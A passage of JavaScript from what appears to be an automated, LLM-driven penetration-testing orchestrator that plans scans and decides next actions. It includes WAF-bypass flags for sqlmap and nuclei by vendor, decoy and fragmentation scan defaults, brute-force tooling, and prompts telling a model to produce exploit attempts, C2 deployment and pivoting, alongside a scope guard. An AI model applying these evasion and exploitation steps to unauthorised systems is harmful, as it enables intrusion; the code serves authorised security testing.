    totalFindings: data.totalFindings,
    overallRiskScore: data.overallRiskScore,
    executiveSummary: data.executiveSummary?.slice(0, 500),
    emailSecurity: data.emailSecurity,
    wafAssessment: data.wafAssessment ? {
      detected: data.wafAssessment.detected,
      vendor: data.wafAssessment.vendor,
      bypassDifficulty: data.wafAssessment.bypassDifficulty
    } : void 0,
    oemCredentials: (data.oemCredentials || []).slice(0, 10).map((c) => ({
      vendor: c.vendor,
      product: c.product,
      protocol: c.protocol,
      port: c.port
    })),
    connectorStats: (data.connectorStats || []).filter((c) => c.observations > 0).map((c) => `${c.name}: ${c.observations} obs`)
  })) : [];
  const toolRef = [
    "ScanForge Discovery (Masscan/Naabu/RustScan): port scan/service detection",
    "nuclei: vuln scanner (-u URL -severity critical,high,medium -nc -duc -ni -jsonl)",
    "nikto: web server scanner (-h URL)",
    "gobuster: dir brute-forcer (supports -x extensions, -r follow redirects, --random-agent, -b exclude status codes, -m HTTP method, -c cookies for auth scanning)",
    "httpx: HTTP probe (echo URL | httpx -json -tech-detect -status-code -title -follow-redirects)",
    "hydra: credential brute-forcer",
    "enum4linux: SMB/NetBIOS enum",
    "smbclient: SMB share lister",
    "ldapsearch: LDAP enum",
    "dig: DNS queries/zone transfers",
    "onesixtyone: SNMP scanner",
    "subfinder: subdomain discovery (broad scope only)",
    "cloud_enum: multi-cloud resource enum (-k keyword)",
    "s3scanner: S3 bucket ACL check (echo bucket | s3scanner scan --json)",
    "trufflehog: secret scanner for buckets",
    "aws: S3 CLI (aws s3 ls s3://bucket --no-sign-request)",
    "gobuster: directory/file brute-force (gobuster dir -u URL -w /opt/SecLists/Discovery/Web-Content/common.txt -t 10 -q --no-error -x php,html,js,txt -r --random-agent)",
    "sqlmap: SQLi exploitation (only confirmed targets)",
    "testssl: TLS/SSL vuln scanner",
    "whatweb: tech fingerprinter",
    "wpscan: WordPress scanner (only when WP detected)",
    "amass: attack surface mapping (amass enum -d domain -passive)"
  ].join("\n");
  const systemPrompt = `You are a penetration tester planning active scanning for a ${state.engagementType} engagement after passive OSINT.

PHASE A \u2014 Discovery: ScanForge discovery --top-ports 1000 -T3 then httpx on web ports. discoveryFlags = scan type/evasion only (no -p, --top-ports, -T). Cloud/WAF targets: use '-Pn -sV -sC' only, no evasion flags.
PHASE B \u2014 Targeted tools per asset based on recon: Web\u2192nuclei,nikto,gobuster,whatweb,testssl; WP\u2192wpscan; SQLi\u2192sqlmap; Cloud\u2192cloud_enum,s3scanner; SMB\u2192enum4linux; LDAP\u2192ldapsearch; DNS\u2192dig; SNMP\u2192onesixtyone; Login\u2192hydra.

GOBUSTER GUIDANCE:
- When a login page is detected, recommend authenticated Gobuster scanning with discovered session cookies (-c flag)
- When a specific tech stack is identified (PHP, ASP.NET, Java), recommend extension enumeration matching that stack (-x php,phtml or -x asp,aspx,ashx or -x jsp,do,action)
- When WAF is detected, recommend status code filtering (-b 403) and reduced thread count (-t 10)
- For API targets, recommend HTTP method enumeration (-m GET,POST,PUT,DELETE)
- Always use --random-agent to avoid WAF fingerprinting of scanner User-Agents

Tools:
${toolRef}

Return valid JSON per the response_format schema.`;
  const assetLines = assetSummaries.map((a) => {
    const parts = [`${a.hostname}${a.ip ? " (" + a.ip + ")" : ""} [${a.type}]`];
    if (a.wafDetected && a.wafDetected !== "none") parts.push(`WAF:${a.wafDetected}`);
    if (a.cloudProvider) parts.push(`Cloud:${a.cloudProvider}`);
    if (a.ports?.length) parts.push(`Ports:${a.ports.map((p) => typeof p === "object" ? `${p.port}/${p.service || ""}` : p).join(",")}`);
    if (a.technologies?.length) parts.push(`Tech:${a.technologies.slice(0, 5).join(",")}`);
    if (a.riskSignals?.length) parts.push(`Risks:${a.riskSignals.length}`);
    if (a.toolResults?.length) {
      const tools = a.toolResults.map((t) => `${t.tool}(${t.findingCount})`).join(",");
      parts.push(`Scanned:${tools}`);
    }
    return parts.join(" | ");
  }).join("\n");
  const domainLines = domainReconSummary.map((d) => {
    const parts = [`${d.domain}: risk=${d.overallRiskScore || "?"}, findings=${d.totalFindings || 0}`];
    if (d.wafAssessment?.detected) parts.push(`WAF:${d.wafAssessment.vendor}`);
    if (d.emailSecurity) parts.push(`Email:${JSON.stringify(d.emailSecurity).substring(0, 80)}`);
    return parts.join(" | ");
  }).join("\n");
  const tier1Content = `Assets (${state.assets.length}, ${state.engagementType}):
${assetLines}
${domainLines ? "\nDomain Intel:\n" + domainLines + "\n" : ""}
Generate two-phase scan plan. Phase A: ScanForge discovery --top-ports 1000. Phase B: tools per asset.`;
  const detectedTech = state.assets.flatMap((a) => [
    ...a.type !== "unknown" ? [a.type] : [],
    ...a.ports.map((p) => p.service).filter(Boolean)
  ]);
  const uniqueTech = [...new Set(detectedTech)];
  const allObs = state.assets.flatMap((a) => [
    ...a.passiveRecon?.technologies || [],
    ...a.passiveRecon?.riskSignals?.map((r) => r.rationale) || [],
    a.passiveRecon?.cloudProvider || ""
  ]).filter(Boolean);
  let enrichmentCtx = "";
  try {
    const ontologyCtx = uniqueTech.length > 0 ? formatOntologyForPrompt(uniqueTech) : "";
    const bbCtx = getTrainingExamplesForPrompt(2);
    const corpusCtx = getTriageCorpusContext(void 0, 2);
    const cloudCtx = allObs.length > 0 ? buildCloudSecurityContext(allObs) : buildGeneralCloudContext();
    const discoveryCtx = getScanforgeScanPlanContext({
      detectedTech: uniqueTech,
      cloudProvider: state.assets.find((a) => a.passiveRecon?.cloudProvider)?.passiveRecon?.cloudProvider,
      hasFirewall: state.assets.some((a) => a.wafDetected && a.wafDetected !== "none"),
      hasIDS: state.engagementType === "red_team",
      stealthRequired: state.engagementType === "red_team"
    });
    const owaspCtx = getOwaspScanPlanContext(uniqueTech);
    const threatGroupCtx = getThreatGroupScanContext({ technologies: uniqueTech });
    const offensiveTechCtx = buildOffensiveTechniquesContext({
      phase: "enumeration",
      hasFirewall: state.assets.some((a) => a.wafDetected && a.wafDetected !== "none"),
      hasWAF: state.assets.some((a) => a.wafDetected && a.wafDetected !== "none"),
      hasFileUpload: uniqueTech.some((t) => /upload|file|cms|wordpress|drupal|joomla/i.test(t)),
      includeShodan: true
    });
    const zapKnowledgeCtx = buildZAPKnowledgeContext({
      phase: "enumeration",
      technology: uniqueTech[0]
    });
    const toolsCtx = buildToolRecommendationContext({
      phase: "enumeration",
      hasWebApp: uniqueTech.some((t) => /http|web|html|php|asp|jsp|node|react|angular|vue/i.test(t)),
      hasAPI: uniqueTech.some((t) => /api|rest|graphql|json|soap/i.test(t)),
      detectedTech: uniqueTech
    });
    const targetPreset = state.assets?.[0]?.hostname?.includes("bwapp") ? "bwapp" : state.assets?.[0]?.hostname?.includes("mutillidae") ? "mutillidae" : state.assets?.[0]?.hostname?.includes("crapi") ? "crapi" : state.assets?.[0]?.hostname?.includes("dvwa") ? "dvwa" : state.assets?.[0]?.hostname?.includes("juice") ? "juice-shop" : state.assets?.[0]?.hostname?.includes("webgoat") ? "webgoat" : state.assets?.[0]?.hostname?.includes("vampi") ? "vampi" : state.assets?.[0]?.hostname?.includes("dvga") ? "dvga" : state.assets?.[0]?.hostname?.includes("brokencrystals") ? "broken-crystals" : void 0;
    const methodologyCtx = buildMethodologyContext(targetPreset);
    const phaseToolCtx = buildPhaseToolContext("enumeration");
    const sourceSecretsCtx = buildSourceSecretsContext({
      phase: "enumeration",
      includeSecretPatterns: true,
      includeSourceDisclosure: true,
      includeJSAnalysis: false,
      includeBrowserStorage: false,
      technology: uniqueTech[0]
    });
    let threatActorLearningCtx = "";
    try {
      threatActorLearningCtx = await buildThreatActorLearningContext();
    } catch (e) {
      console.warn("[ScanPlan] Failed to build threat actor learning context:", e);
    }
    let injectionToolsCtx = "";
    try {
      const { buildInjectionToolContext } = await import("./injection-tools-knowledge-K36VNB5D.js");
      injectionToolsCtx = buildInjectionToolContext();
    } catch (e) {
      console.warn("[ScanPlan] Failed to build injection tools context:", e);
    }
    let wafAdaptiveCtx = "";
    try {
      const detectedWAFs = state.assets.filter((a) => a.wafDetected && a.wafDetected !== "none").map((a) => ({ host: a.hostname, waf: a.wafDetected }));
      if (detectedWAFs.length > 0) {
        const wafSections = ["## WAF-Adaptive Tool Configuration\n"];
        for (const { host, waf } of detectedWAFs) {
          const wafLower = (waf || "").toLowerCase();
          wafSections.push(`### ${host} \u2014 ${waf} WAF Detected`);
          wafSections.push("**General evasion:**");
          wafSections.push("- Add random delays: `--delay 2 --random-agent`");
          wafSections.push("- Use encoding: URL-encode payloads, double-encode for strict WAFs");
          wafSections.push("- Fragment requests: use chunked transfer encoding");
          if (/cloudflare/i.test(wafLower)) {
            wafSections.push("**Cloudflare-specific:**");
            wafSections.push("- SQLMap: `--tamper=between,randomcase,space2comment --random-agent --delay=3`");
            wafSections.push('- Nuclei: `-rl 5 -c 2 -H "Cache-Control: no-transform"` (rate limit to 5 req/s)');
            wafSections.push("- Commix: `--tamper=base64encode --delay=2 --random-agent`");
            wafSections.push("- XSS: Use DOM-based vectors, avoid `<script>` tags, use event handlers");
            wafSections.push("- Bypass: Try origin IP via DNS history, check for direct IP access");
          } else if (/akamai/i.test(wafLower)) {
            wafSections.push("**Akamai-specific:**");
            wafSections.push("- SQLMap: `--tamper=charencode,between --random-agent --delay=5`");
            wafSections.push("- Nuclei: `-rl 3 -c 1` (very aggressive rate limiting)");
            wafSections.push("- Use HTTP/2 where possible, Akamai blocks HTTP/1.0");
            wafSections.push("- Avoid common scanner User-Agents (nikto, sqlmap default)");
          } else if (/aws|shield|waf/i.test(wafLower)) {
            wafSections.push("**AWS WAF-specific:**");
            wafSections.push("- SQLMap: `--tamper=space2comment,randomcase --random-agent`");
            wafSections.push("- Use case variation and comment injection for SQL bypass");
            wafSections.push("- Check for WAF rule groups: SQLi, XSS, LFI are separate rule sets");
          } else if (/imperva|incapsula/i.test(wafLower)) {
            wafSections.push("**Imperva-specific:**");
            wafSections.push("- SQLMap: `--tamper=apostrophemask,equaltolike --delay=3`");
            wafSections.push("- Rotate User-Agents per request");
            wafSections.push("- Use HPP (HTTP Parameter Pollution) for bypass");
          } else if (/f5|big.?ip/i.test(wafLower)) {
            wafSections.push("**F5 BIG-IP-specific:**");
            wafSections.push("- SQLMap: `--tamper=space2mssqlblank,charencode`");
            wafSections.push("- Check for ASM vs Advanced WAF (different bypass techniques)");
          } else {
            wafSections.push("**Generic WAF bypass:**");
            wafSections.push("- Try all tamper scripts: `--tamper=apostrophemask,between,randomcase`");
            wafSections.push("- Use alternative encoding (Unicode, hex, double-URL)");
            wafSections.push("- Test with different HTTP methods (GET vs POST vs PUT)");
          }
          wafSections.push("");
        }
        wafAdaptiveCtx = wafSections.join("\n");
      }
    } catch (e) {
      console.warn("[ScanPlan] Failed to build WAF adaptive context:", e);
    }
    let toolAvailabilityCtx = "";
    try {
      const { getToolInventory, getInventoryForLLM } = await import("./scan-server-inventory-HLTDQT7Y.js");
      const inventory = await getToolInventory();
      if (inventory.serverReachable) {
        toolAvailabilityCtx = "## Scan Server Tool Inventory\n" + getInventoryForLLM(inventory);
      }
      const failedTools = /* @__PURE__ */ new Set();
      for (const asset of state.assets) {
        for (const tr of asset.toolResults || []) {
          if (tr.outputPreview && /command not found|not installed|No such file|ENOENT/i.test(tr.outputPreview)) {
            failedTools.add(tr.tool);
          }
        }
      }
      if (failedTools.size > 0) {
        toolAvailabilityCtx += `

## Runtime Tool Failures
**The following tools FAILED during this engagement \u2014 do NOT recommend them:**
${[...failedTools].map((t) => `- ${t} (runtime failure)`).join("\n")}

Use alternative tools instead.`;
      }
    } catch (e) {
      console.warn("[ScanPlan] Failed to build tool availability context:", e);
    }
    let bankingCtx = "";
    try {
      const inferredSector = state.engagementContext?.inferredSector || "";
      if (inferredSector === "banking_financial_services" || state.assets.some((a) => /bank|altoro|mutual|vulnbank|fintech|payment/i.test(a.hostname))) {
        const { buildBankingDomainContext } = await import("./banking-domain-knowledge-Y6J6N5XW.js");
        bankingCtx = buildBankingDomainContext({ phase: "enumeration", includeRegulatory: true, includeTechStack: true });
        console.log("[ScanPlan] Banking domain knowledge injected");
      }
    } catch (e) {
      console.warn("[ScanPlan] Failed to build banking context:", e);
    }
    const { capLLMContext } = await import("./memory-manager-VARXZ63M.js");
    const _scanPlanContextBlocks = [
      { label: "banking", content: bankingCtx || "" },
      { label: "ontology", content: ontologyCtx ? "## Asset Architecture Context\n" + ontologyCtx : "" },
      { label: "bugbounty", content: bbCtx ? "## Bug Bounty Methodology\n" + bbCtx : "" },
      { label: "triage", content: corpusCtx ? "## Triage Examples\n" + corpusCtx : "" },
      { label: "cloud", content: cloudCtx || "" },
      { label: "scanforge-discovery", content: discoveryCtx || "" },
      { label: "owasp", content: owaspCtx || "" },
      { label: "threatGroup", content: threatGroupCtx || "" },
      { label: "threatActor", content: threatActorLearningCtx || "" },
      { label: "offensive", content: offensiveTechCtx || "" },
      { label: "zap", content: zapKnowledgeCtx || "" },
      { label: "burp", content: buildBurpKnowledgeContext({ phase: "enumeration", technology: uniqueTech[0], includeAttackProfiles: true, includeCrossToolCorrelation: true }) },
      { label: "secrets", content: sourceSecretsCtx || "" },
      { label: "tools", content: toolsCtx || "" },
      { label: "methodology", content: methodologyCtx ? "## Attack Methodology Knowledge\n" + methodologyCtx : "" },
      { label: "phaseTool", content: phaseToolCtx ? "## Phase Tool Recommendations\n" + phaseToolCtx : "" },
      { label: "injectionTools", content: injectionToolsCtx || "" },
      { label: "wafAdaptive", content: wafAdaptiveCtx || "" },
      { label: "toolAvailability", content: toolAvailabilityCtx || "" },
      { label: "missedVuln", content: buildMissedVulnContext({ targetPreset: targetPreset || void 0 }) },
      // Context-aware target profiles (WAF/CDN/topology) — if profiling ran before scan plan generation
      { label: "targetProfiles", content: (() => {
        if (!state.targetProfiles || Object.keys(state.targetProfiles).length === 0) return "";
        try {
          const { buildTargetProfileContext } = (init_context_aware_scanner(), __toCommonJS(context_aware_scanner_exports));
          const profileCtxParts = [];
          for (const [host, profile] of Object.entries(state.targetProfiles)) {
            profileCtxParts.push(buildTargetProfileContext(profile));
          }
          return "## Context-Aware Target Profiles\n" + profileCtxParts.join("\n---\n");
        } catch {
          return "";
        }
      })() }
    ];
    enrichmentCtx = capLLMContext(_scanPlanContextBlocks);
    try {
      const { buildContributionFromBlocks } = (init_context_engine_tracker(), __toCommonJS(context_engine_tracker_exports));
      buildContributionFromBlocks(
        state.engagementId,
        state.assets.map((a) => a.hostname).join(", "),
        "scan_planning",
        _scanPlanContextBlocks,
        enrichmentCtx,
        "scan_planned"
      );
    } catch (e) {
      console.warn("[ContextTracker] Failed to record scan planning contribution:", e);
    }
  } catch (e) {
    console.warn("[ScanPlan] Failed to build enrichment context:", e);
  }
  const fullUserContent = enrichmentCtx ? tier1Content + "\n\n" + enrichmentCtx : tier1Content;
  const scanPlanResponseFormat = {
    type: "json_schema",
    json_schema: {
      name: "scan_plan",
      strict: true,
      schema: {
        type: "object",
        properties: {
          overallStrategy: { type: "string" },
          discoveryStrategy: { type: "string" },
          discoveryEvasionProfile: {
            type: "object",
            properties: {
              timing: { type: "string" },
              fragmentation: { type: "boolean" },
              decoys: { type: "boolean" },
              randomizeHosts: { type: "boolean" },
              dataLengthPadding: { type: "boolean" },
              sourcePortSpoofing: { type: "boolean" },
              rationale: { type: "string" }
            },
            required: ["timing", "fragmentation", "decoys", "randomizeHosts", "dataLengthPadding", "sourcePortSpoofing", "rationale"],
            additionalProperties: false
          },
          estimatedDuration: { type: "string" },
          riskAssessment: { type: "string" },
          assetPlans: {
            type: "array",
            items: {
              type: "object",
              properties: {
                hostname: { type: "string" },
                ip: { type: "string" },
                assetType: { type: "string" },
                discoveryFlags: { type: "string" },
                discoveryRationale: { type: "string" },
                httpxFlags: { type: "string", description: "httpx flags for HTTP probing on discovered web ports" },
                activeTools: {
                  type: "array",
                  items: {
                    type: "object",
                    properties: {
                      tool: { type: "string" },
                      command: { type: "string" },
                      rationale: { type: "string" },
                      priority: { type: "number" }
                    },
                    required: ["tool", "command", "rationale", "priority"],
                    additionalProperties: false
                  }
                },
                riskNotes: { type: "string" },
                evasionTechniques: { type: "array", items: { type: "string" } }
              },
              required: ["hostname", "ip", "assetType", "discoveryFlags", "discoveryRationale", "httpxFlags", "discoveryFlags", "discoveryRationale", "activeTools", "riskNotes", "evasionTechniques"],
              additionalProperties: false
            }
          }
        },
        required: ["overallStrategy", "discoveryStrategy", "discoveryEvasionProfile", "estimatedDuration", "riskAssessment", "assetPlans"],
        additionalProperties: false
      }
    }
  };
  let response;
  let usedPath = "specialist";
  try {
    console.log(`[ScanPlan] Using Attack Planner specialist...`);
    const { planAttack } = await import("./attack-planner-RSHNYFLJ.js");
    const attackPlan = await planAttack({
      passiveReconSummary: fullUserContent,
      engagement: {
        engagementType: state.engagementType,
        clientName: state.assets[0]?.hostname,
        targetCount: state.assets.length
      },
      assets: state.assets.map((a) => ({
        hostname: a.hostname,
        ip: a.ip,
        type: a.type,
        status: a.status,
        ports: a.ports.map((p) => ({ port: p.port, service: p.service, version: p.version })),
        technologies: a.passiveRecon?.technologies,
        wafDetected: a.wafDetected,
        cloudProvider: a.passiveRecon?.cloudProvider,
        riskSignals: a.passiveRecon?.riskSignals?.map((r) => ({ severity: r.severity, rationale: r.rationale }))
      })),
      engagementId: state.engagementId
    });
    const mappedContent = JSON.stringify({
      overallStrategy: attackPlan.attack_objective + " \u2014 " + attackPlan.estimated_impact,
      discoveryStrategy: "Full port discovery with evasion techniques",
      discoveryEvasionProfile: {
        timing: "T2",
        fragmentation: true,
        decoys: true,
        randomizeHosts: true,
        dataLengthPadding: true,
        sourcePortSpoofing: false,
        rationale: `Attack confidence: ${attackPlan.confidence}. Detection risks: ${attackPlan.detection_opportunities.join("; ")}`
      },
      estimatedDuration: "Varies by target count",
      riskAssessment: attackPlan.estimated_impact,
      assetPlans: attackPlan.scan_plan.discovery_targets.map((nt) => {
        const webScans = attackPlan.scan_plan.web_scan_targets.filter((w) => w.target === nt.target);
        const nucleiScans = attackPlan.scan_plan.nuclei_targets.filter((n) => n.target === nt.target);
        return {
          hostname: nt.target,
          ip: state.assets.find((a) => a.hostname === nt.target)?.ip || nt.target,
          assetType: state.assets.find((a) => a.hostname === nt.target)?.type || "unknown",
          discoveryFlags: nt.flags || "--rate 1000 --top-ports 1000",
          discoveryRationale: nt.rationale || "Default discovery with evasion",
          httpxFlags: "-json -tech-detect -status-code -title -cdn -tls-grab -follow-redirects -content-length -web-server -silent",
          activeTools: [
            ...nucleiScans.map((n) => ({ tool: "nuclei", command: `nuclei -u ${n.target} -severity critical,high,medium -tags ${n.templates} -nc -duc -ni -jsonl`, rationale: n.rationale, priority: 1 })),
            ...webScans.map((w) => ({ tool: w.tool, command: w.config, rationale: w.rationale, priority: 2 }))
          ],
          riskNotes: attackPlan.detection_opportunities.join("; "),
          evasionTechniques: ["fragmentation", "decoys", "timing-T2"]
        };
      })
    });
    response = { choices: [{ message: { content: mappedContent } }] };
    if (attackPlan.attack_chain.length > 0) {
      addLog(state, {
        phase: state.phase,
        type: "llm_decision",
        title: "\u2694\uFE0F Attack Chain Identified",
        detail: attackPlan.attack_chain.map((ac) => `${ac.stage}: ${ac.technique} (${ac.mitre_id}) \u2192 ${ac.target}`).join("\n"),
        data: { attackChain: attackPlan.attack_chain, initialAccess: attackPlan.initial_access_options }
      });
      broadcastOpsUpdate(engagementId, { type: "log_update" });
    }
  } catch (specialistErr) {
    console.warn(`[ScanPlan] Specialist failed: ${specialistErr.message}. Falling back to direct LLM...`);
    addLog(state, {
      phase: state.phase,
      type: "warning",
      title: "Attack Planner Specialist Failed \u2014 Falling Back",
      detail: `${specialistErr.message?.substring(0, 150)}. Using direct LLM call...`
    });
    broadcastOpsUpdate(engagementId, { type: "log_update" });
    usedPath = "direct-llm";
    try {
      response = await throttledLLMCall({
        messages: [
          { role: "system", content: systemPrompt },
          { role: "user", content: tier1Content }
        ],
        _caller: "engagement-orchestrator.generateScanPlan.fallback",
        _engagementId: state.engagementId,
        response_format: scanPlanResponseFormat
      });
    } catch (fallbackErr) {
      addLog(state, {
        phase: state.phase,
        type: "error",
        title: "LLM Scan Plan Failed",
        detail: `Both specialist and direct LLM failed after retries. Error: ${fallbackErr.message?.substring(0, 200)}`
      });
      broadcastOpsUpdate(engagementId, { type: "log_update" });
      throw fallbackErr;
    }
  }
  console.log(`[ScanPlan] Succeeded with ${usedPath} path`);
  let parsed;
  try {
    const content = response.choices?.[0]?.message?.content || "{}";
    parsed = JSON.parse(content);
  } catch {
    addLog(state, { phase: state.phase, type: "error", title: "Scan Plan Parse Error", detail: "LLM returned invalid JSON for scan plan" });
    throw new Error("Failed to parse LLM scan plan response");
  }
  const scanPlan = {
    generatedAt: Date.now(),
    overallStrategy: parsed.overallStrategy || "Two-phase active scanning with evasion",
    discoveryStrategy: parsed.discoveryStrategy || "Full port discovery with evasion techniques",
    discoveryEvasionProfile: {
      timing: parsed.discoveryEvasionProfile?.timing || "T2",
      fragmentation: parsed.discoveryEvasionProfile?.fragmentation ?? true,
      decoys: parsed.discoveryEvasionProfile?.decoys ?? true,
      randomizeHosts: parsed.discoveryEvasionProfile?.randomizeHosts ?? true,
      dataLengthPadding: parsed.discoveryEvasionProfile?.dataLengthPadding ?? true,
      sourcePortSpoofing: parsed.discoveryEvasionProfile?.sourcePortSpoofing ?? false,
      rationale: parsed.discoveryEvasionProfile?.rationale || "Default evasion profile for safe discovery"
    },
    estimatedDuration: parsed.estimatedDuration || "Unknown",
    riskAssessment: parsed.riskAssessment || "Standard risk",
    assetPlans: (parsed.assetPlans || []).map((ap) => ({
      hostname: ap.hostname,
      ip: ap.ip,
      assetType: ap.assetType,
      discoveryFlags: ap.discoveryFlags || "-Pn -sV -sC -O -f -T2 -D RND:5 --data-length 64",
      discoveryRationale: ap.discoveryRationale || "Default discovery scan with evasion and --top-ports 1000",
      httpxFlags: ap.httpxFlags || "-json -tech-detect -status-code -title -cdn -tls-grab -follow-redirects -content-length -web-server -silent",
      activeTools: (ap.activeTools || []).map((t) => ({
        tool: t.tool,
        command: t.command,
        rationale: t.rationale,
        priority: t.priority || 2
      })),
      riskNotes: ap.riskNotes,
      evasionTechniques: ap.evasionTechniques || []
    }))
  };
  state.scanPlan = scanPlan;
  await persistOpsStateNow(engagementId);
  const ep = scanPlan.discoveryEvasionProfile;
  const evasionFlags = [
    ep.fragmentation ? "fragmentation" : null,
    ep.decoys ? "decoys" : null,
    ep.randomizeHosts ? "host-randomization" : null,
    ep.dataLengthPadding ? "data-padding" : null,
    ep.sourcePortSpoofing ? "source-port-spoofing" : null
  ].filter(Boolean).join(", ");
  addLog(state, {
    phase: state.phase,
    type: "llm_decision",
    title: "\u{1F4CB} Two-Phase Scan Plan Generated",
    detail: `Strategy: ${scanPlan.overallStrategy}

\u{1F50D} Phase A \u2014 Discovery: ${scanPlan.discoveryStrategy}
Evasion: ${evasionFlags} (timing: ${ep.timing})
Rationale: ${ep.rationale}

\u{1F3AF} Phase B \u2014 Targeted tools per asset
Estimated duration: ${scanPlan.estimatedDuration}
Assets planned: ${scanPlan.assetPlans.length}`,
    data: { scanPlan }
  });
  for (const ap of scanPlan.assetPlans) {
    addLog(state, {
      phase: state.phase,
      type: "tool_match",
      title: `\u{1F3AF} ${ap.hostname}${ap.ip && ap.ip !== ap.hostname ? ` (${ap.ip})` : ""}`,
      detail: `Phase A discovery: ${ap.discoveryFlags}
  Rationale: ${ap.discoveryRationale}
Phase B targeted: ${ap.discoveryFlags}
  Rationale: ${ap.discoveryRationale}
Tools: ${ap.activeTools.map((t) => t.tool).join(", ")}
Evasion: ${ap.evasionTechniques.join(", ")}
Risk: ${ap.riskNotes}`,
      data: { assetPlan: ap }
    });
  }
  broadcastOpsUpdate(engagementId, { type: "scan_plan", scanPlan });
  return scanPlan;
}
async function llmDecide(context) {
  const assetSummary = context.assets.map(
    (a) => `${a.hostname}${a.ip ? "(" + a.ip + ")" : ""} [${a.type}] ${a.status} ports:${a.ports.length} vulns:${a.vulns.length} zap:${a.zapFindings.length}${a.wafDetected ? " WAF:" + a.wafDetected : ""}`
  ).join("\n");
  const recentActivity = context.recentLog.slice(-10).map((l) => `[${l.type}] ${l.title}`).join("\n");
  const skipSpecialist = ["exploitation", "post_exploit"].includes(context.phase);
  if (skipSpecialist) {
    console.log(`[OpsLLM] Skipping ops-decider specialist for ${context.phase} phase \u2014 using direct LLM for exploit action generation`);
  }
  if (!skipSpecialist) try {
    const { decideNextOp } = await import("./ops-decider-V5TWZUS7.js");
    const opsResult = await decideNextOp({
      currentPhase: context.phase,
      recentActivity,
      assetSummary,
      availableTools: ["scanforge-discovery", "nuclei", "zap", "nikto", "gobuster", "testssl", "hydra", "sqlmap"],
      engagement: {
        engagementType: context.engagementType,
        clientName: context.assets[0]?.hostname,
        targetCount: context.assets.length
      },
      engagementId: context.engagementId
    });
    const toolToActionType = {
      discovery: "discovery_scan",
      nuclei: "nuclei_scan",
      zap: "zap_scan",
      nikto: "nuclei_scan",
      gobuster: "nuclei_scan",
      testssl: "nuclei_scan",
      hydra: "exploit_attempt",
      sqlmap: "exploit_attempt"
    };
    const actionType = toolToActionType[opsResult.recommended_action.tool] || "discovery_scan";
    const actions = [{
      type: actionType,
      params: {
        target: opsResult.recommended_action.target,
        targets: [opsResult.recommended_action.target],
        tool: opsResult.recommended_action.tool,
        profile: "standard"
      }
    }];
    for (const alt of opsResult.alternative_actions.slice(0, 2)) {
      actions.push({ type: "discovery_scan", params: { reason: alt.action } });
    }
    return {
      decision: opsResult.recommended_action.action,
      reasoning: `[${opsResult.confidence}] ${opsResult.current_assessment}
Gaps: ${opsResult.coverage_gaps.join(", ")}
Rationale: ${opsResult.recommended_action.rationale}${opsResult.should_escalate ? "\n\u26A0\uFE0F ESCALATION RECOMMENDED" : ""}`,
      actions
    };
  } catch (specialistErr) {
    console.warn(`[OpsLLM] Specialist failed: ${specialistErr.message}. Falling back to direct LLM...`);
  }
  if (context.question.length > 15e3) {
    console.warn(`[OpsLLM] Question too large (${context.question.length} chars), truncating to 15K`);
    context.question = context.question.slice(0, 15e3) + "\n[...context truncated for memory]";
  }
  const exploitPhaseInstructions = ["exploitation", "post_exploit"].includes(context.phase) ? `

IMPORTANT: You are in the ${context.phase} phase. You MUST return actions with type "exploit_attempt" for each vulnerability you want to exploit.
Each exploit_attempt action MUST include params: {target: "hostname", port: number, cve: "CVE-XXXX-XXXXX", service: "service_name", module: "exploit_module_or_technique"}
Prioritize critical and high severity vulnerabilities. Generate one exploit_attempt action per target/CVE combination.
Do NOT return scan-type actions (discovery_scan, nuclei_scan) during exploitation \u2014 only exploit_attempt, c2_deploy, or complete.` : "";
  let bankingOpsCtx = "";
  try {
    if (context.assets?.some((a) => /bank|altoro|mutual|vulnbank|fintech|payment/i.test(a.hostname || a.ip || ""))) {
      const { getBankingContextCompact, buildBankingDomainContext } = await import("./banking-domain-knowledge-Y6J6N5XW.js");
      bankingOpsCtx = ["exploitation", "post_exploit"].includes(context.phase) ? "\n\n" + buildBankingDomainContext({ phase: context.phase, includeRegulatory: false, includeTechStack: false, includeAttackScenarios: true }) : "\n\n" + getBankingContextCompact();
    }
  } catch (e) {
  }
  const systemPrompt = `Pentest AI for ${context.engagementType} engagement. Phase: ${context.phase}.
Assets:
${assetSummary}

Recent:
${recentActivity}

Return JSON: {"decision":"str","reasoning":"str","actions":[{"type":"discovery_scan|nuclei_scan|zap_scan|exploit_attempt|c2_deploy|recon|skip|complete|wait","params":{...}}]}
Action params: discovery_scan={targets,profile:quick|standard|deep|stealth|service|vuln} nuclei_scan={targets,severity,tags?} zap_scan={targetUrl,scanType:full|active|spider_only,wafAware} exploit_attempt={target,port,cve,service,module?} c2_deploy={target,platform,method} recon={domain} complete={reason}
Rules: pentest=test each asset systematically; red_team=find weakest entry,exploit,C2,pivot; WAF-aware scanning; correlate findings across tools; flag high-risk actions; stay in scope.${exploitPhaseInstructions}${bankingOpsCtx}`;
  try {
    const response = await throttledLLMCall({
      messages: [
        { role: "system", content: systemPrompt },
        { role: "user", content: context.question }
      ],
      _caller: "engagement-orchestrator.opsDecision",
      _engagementId: context.engagementId,
      response_format: {
        type: "json_object"
      }
    });
    const content = response.choices?.[0]?.message?.content;
    if (!content) throw new Error("Empty LLM response");
    return JSON.parse(content);
  } catch (e) {
    console.warn("[OpsLLM] Decision failed after retries:", e.message);
    return {
      decision: "LLM decision failed, falling back to sequential scan",
      reasoning: e.message,
      actions: [{ type: "skip", params: { reason: "LLM unavailable" } }]
    };
  }
}
async function executeRecon(state, engagement, operatorCtx) {
  state.phase = "recon";
  state.currentAction = "Running passive reconnaissance...";
  addLog(state, { phase: "recon", type: "info", title: "\u{1F50D} Phase 1: Domain Recon", detail: "Starting passive OSINT and domain intelligence gathering" });
  broadcastOpsUpdate(state.engagementId, { type: "phase_change", phase: "recon" });
  const domains = (engagement.targetDomain || "").split(/[,;\s]+/).filter(Boolean);
  const ipRanges = (engagement.targetIpRange || "").split(/[,;\s]+/).filter(Boolean);
  state.roeScopeGuard = {
    authorizedDomains: [...domains],
    authorizedIps: [...ipRanges],
    roeStatus: engagement.roeStatus || engagement.roe_status || "signed"
  };
  addLog(state, {
    phase: "recon",
    type: "info",
    title: "\u{1F6E1}\uFE0F RoE Scope Guard Activated",
    detail: `Authorized targets: ${domains.join(", ")}${ipRanges.length ? " | IPs: " + ipRanges.join(", ") : ""}
Only these targets will be actively scanned. Discovered assets outside scope will be tagged but NOT probed.`
  });
  if (state.engagementType === "bug_bounty" || engagement.engagementType === "bug_bounty") {
    try {
      const { getProgramRoE, generateOperatorBriefing, enforceScanAction } = await import("./bb-roe-enforcement-IN5S6P26.js");
      const roeScope = engagement.roeScope || engagement.roe_scope;
